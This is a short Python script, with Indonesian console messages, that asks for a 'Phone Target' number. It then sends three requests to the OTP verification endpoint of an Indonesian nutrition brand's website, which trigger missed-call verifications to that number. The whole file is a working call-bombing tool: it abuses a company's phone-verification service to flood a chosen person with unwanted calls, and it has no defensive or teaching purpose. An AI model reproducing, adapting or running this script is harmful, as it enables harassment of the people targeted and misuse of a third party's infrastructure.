import requests, time
import json

UNGU = '\033[95m'
BIRU = '\033[94m'
HIJAU = '\033[92m'
KUNING = '\033[93m'
MERAH = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[97m'
EBLE = '\033[2;34m'

class Call:

	def __init__(self):
		self.kopit = requests.Session()
		self.call()

	def call(self):
		try:
			print("\n     {}[{}!{}] Example : \033[93m821219xxxxx".format(BOLD,EBLE,ENDC,BOLD))
			call = int(input("     {}[{}•{}] Phone Target : ".format(BOLD,EBLE,ENDC,BOLD)));print("")
			for coli in range(3):
				self.api = self.kopit.post("https://www.nutriclub.co.id/otp/?phone=0{}&old_phone=0{}".format(call,call))
				if json.loads(self.api.text)["StatusMessage"] == 'Request misscall berhasil':
					print("     \033[97m[\033[92m✓\033[97m] Call To \033[93m{} \033[92mBerhasil!".format(call))
					time.sleep(2.5)
				else:
					print("     \033[97m[\033[91m!\033[97m] Call To \033[93m{} \033[91mGagal!".format(call))
					time.sleep(2.5)
		except:
			pass

		print("\n     {}[{}•{}] Done ...\n".format(BOLD,EBLE,ENDC,BOLD))
